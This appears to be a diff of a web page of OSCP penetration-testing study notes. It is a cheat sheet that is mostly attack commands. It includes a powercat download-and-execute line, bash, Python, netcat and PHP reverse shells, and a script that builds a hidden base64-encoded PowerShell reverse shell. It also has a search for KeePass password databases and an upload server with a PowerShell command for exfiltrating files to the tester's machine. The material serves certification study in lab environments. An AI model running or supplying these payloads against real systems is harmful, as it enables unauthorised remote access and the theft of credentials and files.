@@ -1,105 +1,108 @@
 <p><a href="https://johnstawinski.com/2022/10/09/oscp-2023-study-guide-new-exam-format/">https://johnstawinski.com/2022/10/09/oscp-2023-study-guide-new-exam-format/</a>
-<a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec’s videos</a> - vital at the beginning - show a bunch of HTB walkthroughs</p>
-<ul>
-<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a> - search up video on a topic
-<a href="https://app.hackthebox.com/tracks/Active-Directory-101">HackTheBox Active Directory track</a>
-<a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">TJ Null’s list of OSCP-like HTB machines</a></li>
-</ul>
-<ul>
-<li><p>if you see <a href="https://offsecwp/">https://offsecwp/</a>, it&#39;s because /etc/hosts has <code>192.168.50.16 offsecwp</code></p>
-</li>
-<li><p><code>for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done</code></p>
-<ul>
-<li>We have nmap at home</li>
-</ul>
-</li>
-</ul>
-<p>RDP on kali:
-<code>xfreerdp /u:{username} /p:{password} /v:{IP} (optional)/d:{domain} (optional)/drive:shared,/home/kali/Downloads/</code></p>
-<ul>
-<li>Dealing with powershell wrapping? Just put the entire output in a variable and do <code>${variable} | Out-GridView</code></li>
-</ul>
-<p>Using MinGW
-<code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code></p>
-<p>Use <code>psql</code> to connect to PostgreSQL</p>
-<p>Seems the WP admin creds are no longer admin/test, but rather admin/password</p>
-<p>AD cheat sheet - <a href="https://wadcoms.github.io/#">https://wadcoms.github.io/#</a>
-AD mindmap - <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg</a>
-<a href="https://academy.hackthebox.com/module/113/section/1087">HackTheBox - Attacking Common Applications</a>
-<a href="https://academy.hackthebox.com/module/116/section/1140">HackTheBox - Attacking Common Services</a>
-<a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">SQLi cheat sheet</a></p>
-<p>Using SMTP with <code>swaks</code></p>
-<ul>
-<li>To use an SMTP server, we need a user whose credentials we know on the domain
-<code>swaks --server {IP_with_SMTP} --body @{body_txt_file} -ap --from {user@domain} --to {target@domain} --auth-user {user@domain} --auth-password {password} --attach @{file_to_attach}  --header &quot;{header_text}&quot;</code></li>
-</ul>
-<p>If error <code>no PostgreSQL user name specified in startup packet</code>, make sure to:</p>
-<ul>
-<li>add env variables: <pre><code><span class="hljs-keyword">export</span> PGUSER=postgres
-<span class="hljs-keyword">export</span> PGDATABASE=postgres
-</code></pre></li>
-<li><code>sudo apt install libpq-dev</code></li>
-<li><code>sudo apt-get install --reinstall postgresql-client</code></li>
-</ul>
-<p>Run powercat - <code>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.220:8000/powercat.ps1&#39;);powercat -c 192.168.45.220 -p 4444 -e powershell</code></p>
-<p>Search for password database - <code>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code> </p>
-<p>To copy an executable, use <code>iwr -uri http://{kali_IP}/winPEASx64.exe -Outfile winPEAS.exe</code> instead of curl</p>
-<p>Linux reverse shells:</p>
-<ul>
-<li><code>bash -i &gt;&amp; /dev/tcp/{IP}/4444 0&gt;&amp;1</code></li>
-<li><code>busybox nc 10.10.10.10 1234 -e sh</code> or <code>busybox nc 10.10.10.10 1234 -e /bin/sh</code></li>
-<li><code>python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
-<li><code>&lt;?php echo shell_exec(&#39;bash -i &gt;&amp; /dev/tcp/10.11.0.106/443 0&gt;&amp;1&#39;);?&gt;</code></li>
-</ul>
-<p>Windows reverse shell</p>
-<ul>
-<li>Download/transfer netcat (nc.exe within <code>/usr/share/windows-resources/binaries/nc.exe</code>)</li>
-<li><code>C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444</code>
-Powershell reverse shell</li>
-</ul>
-<pre><code>import sys
-import base64
-
-payload = '<span class="hljs-variable">$client</span> = New-Object System.<span class="hljs-keyword">Net</span>.Sockets.TCPClient(<span class="hljs-string">"192.168.45.220"</span>,4444);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%{0};<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.<span class="hljs-keyword">Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | <span class="hljs-keyword">Out</span>-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">"PS "</span> + (<span class="hljs-keyword">pwd</span>).Path + <span class="hljs-string">"&gt; "</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()};<span class="hljs-variable">$client</span>.<span class="hljs-keyword">Close</span>()'
-
-cmd = <span class="hljs-string">"powershell -nop -w hidden -e "</span> + base64.b64encode(payload.<span class="hljs-keyword">encode</span>('utf16')[2:]).<span class="hljs-keyword">decode</span>()
-
-<span class="hljs-keyword">print</span>(cmd)
-</code></pre><p>Transfer files with xfreerdp - <code>xfreerdp /u:{u} /p:{p} /v:{IP} /drive:mydrive,{local_dir_path}</code></p>
-<p>Upgrading linux shell:</p>
-<pre><code><span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span>
-<span class="hljs-keyword">python3</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span>
-<span class="hljs-keyword">echo</span> <span class="hljs-string">'os.system('</span>/bin/bash<span class="hljs-string">')'</span>
-/bin/<span class="hljs-keyword">sh</span> -i
-/bin/bash -i
-<span class="hljs-keyword">perl</span> -<span class="hljs-keyword">e</span> <span class="hljs-string">'exec "/bin/sh";'</span>
-</code></pre><p>Exfiltrate files off of a Windows system
-<code>sudo python3 app.py</code></p>
-<pre><code><span class="hljs-comment">#!/usr/bin/env python3</span>
-from http.server import SimpleHTTPRequestHandler, HTTPServer
-import os
-
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileUploadHTTPRequestHandler</span>(<span class="hljs-title">SimpleHTTPRequestHandler</span>):</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_POST</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
-        content_length = int(<span class="hljs-keyword">self</span>.headers[<span class="hljs-string">'Content-Length'</span>])
-        post_data = <span class="hljs-keyword">self</span>.rfile.read(content_length)
-
-        <span class="hljs-comment"># Get the filename from the POST headers if provided</span>
-        filename = <span class="hljs-keyword">self</span>.headers.get(<span class="hljs-string">'filename'</span>, <span class="hljs-string">'upload.bin'</span>)
-
-        <span class="hljs-comment"># Save the uploaded file</span>
-        with open(filename, <span class="hljs-string">'wb'</span>) as <span class="hljs-symbol">f:</span>
-            f.write(post_data)
-
-        <span class="hljs-comment"># Send a response back to the client</span>
-        <span class="hljs-keyword">self</span>.send_response(<span class="hljs-number">200</span>)
-        <span class="hljs-keyword">self</span>.end_headers()
-        <span class="hljs-keyword">self</span>.wfile.write(b<span class="hljs-string">'File uploaded successfully'</span>)
-
-<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">"__main__"</span>:
-    server_address = (<span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-number">8080</span>)  <span class="hljs-comment"># Use any port you want</span>
-    httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
-    print(f<span class="hljs-string">"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)"</span>)
-    httpd.serve_forever()
-</code></pre><p><code>Invoke-WebRequest -Uri &quot;http://{kali_IP}:8080/upload&quot; -Method Post -InFile &quot;{filename}&quot; -Headers @{&quot;filename&quot;=&quot;{filename}&quot;} -UseBasicParsing</code></p>
-<p>Remember that to have fully compromised a machine, we need Administrator/root (e.g. getting the flag with robocopy wouldn&#39;t count)</p>
+    <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec’s videos</a> - vital at the beginning - show a bunch of HTB walkthroughs</p>
+    <ul>
+    <li><p><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a> - search up video on a topic
+    <a href="https://app.hackthebox.com/tracks/Active-Directory-101">HackTheBox Active Directory track</a>
+    <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">TJ Null’s list of OSCP-like HTB machines</a></p>
+    </li>
+    <li><p><code>for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done</code></p>
+    <ul>
+    <li>We have nmap at home</li>
+    </ul>
+    </li>
+    </ul>
+    <p>RDP on kali:
+    <code>xfreerdp /u:{username} /p:{password} /v:{IP} (optional)/d:{domain} (optional)/drive:shared,/home/kali/Downloads/</code></p>
+    <ul>
+    <li>Dealing with powershell wrapping? Just put the entire output in a variable and do <code>${variable} | Out-GridView</code></li>
+    </ul>
+    <p>Using MinGW
+    <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code></p>
+    <p>Use <code>psql</code> to connect to PostgreSQL</p>
+    <p>Seems the WP admin creds are no longer admin/test, but rather admin/password</p>
+    <p>AD cheat sheet - <a href="https://wadcoms.github.io/#">https://wadcoms.github.io/#</a>
+    AD mindmap - <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg</a>
+    <a href="https://academy.hackthebox.com/module/113/section/1087">HackTheBox - Attacking Common Applications</a>
+    <a href="https://academy.hackthebox.com/module/116/section/1140">HackTheBox - Attacking Common Services</a>
+    <a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">SQLi cheat sheet</a></p>
+    <p>Using SMTP with <code>swaks</code></p>
+    <ul>
+    <li>To use an SMTP server, we need a user whose credentials we know on the domain
+    <code>swaks --server {IP_with_SMTP} --body @{body_txt_file} -ap --from {user@domain} --to {target@domain} --auth-user {user@domain} --auth-password {password} --attach @{file_to_attach}  --header &quot;{header_text}&quot;</code></li>
+    </ul>
+    <p>If error <code>no PostgreSQL user name specified in startup packet</code>, make sure to:</p>
+    <ul>
+    <li>add env variables:</li>
+    </ul>
+    <pre><code>export PGUSER=postgres
+    export PGDATABASE=postgres
+    </code></pre>
+    <ul>
+    <li><code>sudo apt install libpq-dev</code></li>
+    <li><code>sudo apt-get install --reinstall postgresql-client</code></li>
+    </ul>
+    <p>Run powercat - <code>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.220:8000/powercat.ps1&#39;);powercat -c 192.168.45.220 -p 4444 -e powershell</code></p>
+    <p>Search for password database - <code>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code> </p>
+    <p>To copy an executable, use <code>iwr -uri http://{kali_IP}/winPEASx64.exe -Outfile winPEAS.exe</code> instead of curl</p>
+    <p>Linux reverse shells:</p>
+    <ul>
+    <li><code>bash -i &gt;&amp; /dev/tcp/{IP}/4444 0&gt;&amp;1</code></li>
+    <li><code>busybox nc 10.10.10.10 1234 -e sh</code> or <code>busybox nc 10.10.10.10 1234 -e /bin/sh</code></li>
+    <li><code>python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
+    <li><code>&lt;?php echo shell_exec(&#39;bash -i &gt;&amp; /dev/tcp/10.11.0.106/443 0&gt;&amp;1&#39;);?&gt;</code></li>
+    </ul>
+    <p>Windows reverse shell</p>
+    <ul>
+    <li>Download/transfer netcat (nc.exe within <code>/usr/share/windows-resources/binaries/nc.exe</code>)</li>
+    <li><code>C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444</code>
+    Powershell reverse shell</li>
+    </ul>
+    <pre><code>import sys
+    import base64
+    
+    payload = &#39;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.45.220&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;
+    
+    cmd = &quot;powershell -nop -w hidden -e &quot; + base64.b64encode(payload.encode(&#39;utf16&#39;)[2:]).decode()
+    
+    print(cmd)
+    </code></pre>
+    <p>Transfer files with xfreerdp - <code>xfreerdp /u:{u} /p:{p} /v:{IP} /drive:mydrive,{local_dir_path}</code></p>
+    <p>Upgrading linux shell:</p>
+    <pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+    python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+    echo &#39;os.system(&#39;/bin/bash&#39;)&#39;
+    /bin/sh -i
+    /bin/bash -i
+    perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
+    </code></pre>
+    <p>Exfiltrate files off of a Windows system
+    <code>sudo python3 app.py</code></p>
+    <pre><code>#!/usr/bin/env python3
+    from http.server import SimpleHTTPRequestHandler, HTTPServer
+    import os
+    
+    class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
+        def do_POST(self):
+            content_length = int(self.headers[&#39;Content-Length&#39;])
+            post_data = self.rfile.read(content_length)
+    
+            # Get the filename from the POST headers if provided
+            filename = self.headers.get(&#39;filename&#39;, &#39;upload.bin&#39;)
+    
+            # Save the uploaded file
+            with open(filename, &#39;wb&#39;) as f:
+                f.write(post_data)
+    
+            # Send a response back to the client
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b&#39;File uploaded successfully&#39;)
+    
+    if __name__ == &quot;__main__&quot;:
+        server_address = (&#39;0.0.0.0&#39;, 8080)  # Use any port you want
+        httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
+        print(f&quot;Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)&quot;)
+        httpd.serve_forever()
+    </code></pre>
+    <p><code>Invoke-WebRequest -Uri &quot;http://{kali_IP}:8080/upload&quot; -Method Post -InFile &quot;{filename}&quot; -Headers @{&quot;filename&quot;=&quot;{filename}&quot;} -UseBasicParsing</code></p>
+    
